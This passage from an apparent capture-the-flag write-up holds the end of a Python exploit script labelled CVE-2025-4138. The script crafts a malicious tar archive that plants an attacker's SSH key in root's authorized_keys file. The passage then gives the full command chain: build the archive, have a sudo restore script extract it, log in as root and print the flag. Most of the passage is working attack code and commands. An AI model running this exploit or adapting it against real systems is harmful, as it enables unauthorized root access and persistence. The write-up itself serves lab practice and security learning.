        payload_entry.type = tarfile.REGTYPE
        payload_entry.size = len(payload)
        payload_entry.mode = file_mode
        payload_entry.uid = 0
        payload_entry.gid = 0
        tar.addfile(payload_entry, fileobj=io.BytesIO(payload))
    
    print(f"[+] Exploit tar: {tar_path}")
    print(f"[+] Target: {target_file}")
    print(f"[+] Payload size: {len(payload)} bytes")

def main():
    parser = argparse.ArgumentParser(description="CVE-2025-4138 Exploit")
    parser.add_argument("--tar-out", "-o", required=True)
    parser.add_argument("--preset", "-p", choices=["ssh-key"])
    parser.add_argument("--payload", "-P", required=True)
    args = parser.parse_args()
    
    if args.preset == "ssh-key":
        target_file = "/root/.ssh/authorized_keys"
        file_mode = 0o600
        
        # Read SSH key
        with open(os.path.expanduser(args.payload), "rb") as f:
            payload = f.read()
        if not payload.endswith(b"\n"):
            payload += b"\n"
    
    build_exploit_tar(args.tar_out, target_file, payload, file_mode)

if __name__ == "__main__":
    main()
```

## Root Flag

```bash
# Generate SSH key pair
ssh-keygen -t ed25519 -f ~/.ssh/wingdata_key -N ""

# Create malicious backup archive targeting root authorized_keys
python3 exploit.py \
  --preset ssh-key \
  --payload ~/.ssh/wingdata_key.pub \
  --tar-out backup_888.tar

# Move archive into allowed backup directory
mv backup_888.tar /opt/backup_clients/backups/

# Restore crafted backup as root
cd /opt/backup_clients/backups/

sudo /usr/local/bin/python3 \
  /opt/backup_clients/restore_backup_clients.py \
  -b backup_888.tar \
  -r restore_win123

# SSH into root using injected public key
ssh -i ~/.ssh/wingdata_key root@127.0.0.1

# Read root flag
cat /root/root.txt
2ab393ad442a7eb04266be607b12ea88
```
